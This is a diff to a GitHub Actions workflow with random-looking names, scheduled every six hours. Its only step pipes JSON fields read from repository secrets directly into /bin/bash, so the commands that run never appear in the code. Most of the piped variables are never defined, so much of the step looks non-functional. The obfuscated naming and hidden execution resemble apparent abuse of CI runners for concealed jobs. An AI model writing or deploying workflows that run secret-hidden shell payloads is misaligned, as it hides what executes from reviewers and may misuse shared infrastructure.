@@ -1,24 +1,28 @@
 name: langxianao9210
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
-
+    - cron: '9 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: langxianao9210
         env:
-          aliua60: ${{ secrets.aliua60 }}
+          s4534: ${{ secrets.s4534 }}
         run: |
-          echo $aliua60 | jq -r .as71913 | /bin/bash
-          echo $hogia9 | jq -r .b41889 | /bin/bash
-          echo $f854 | jq -r .mevs1 | /bin/bash
-          echo $uxh236 | jq -r .vnn20 | /bin/bash
-          echo $d44 | jq -r .iq1 | /bin/bash
-          echo $wdxb30 | jq -r .dxvtu51360 | /bin/bash
-          echo $swqg22 | jq -r .a497 | /bin/bash
+          echo $s4534 | jq -r .fqmyq3420 | /bin/bash
+          echo $hkepa935 | jq -r .j09 | /bin/bash
+          echo $apid8 | jq -r .msl53 | /bin/bash
+          echo $seipr9270 | jq -r .dm55086 | /bin/bash
+          echo $o06 | jq -r .mt3 | /bin/bash
+          echo $jx4859 | jq -r .vbqi657 | /bin/bash
+          echo $wzwgi8579 | jq -r .neu7611 | /bin/bash
+          echo $vnxk56363 | jq -r .ocq69844 | /bin/bash
+          echo $wfls1 | jq -r .tyghj6117 | /bin/bash
+          echo $fzpk00054 | jq -r .wxlcu78 | /bin/bash
+          echo $ber7564 | jq -r .yjts300 | /bin/bash
+          echo $cjia77435 | jq -r .gk776 | /bin/bash
 
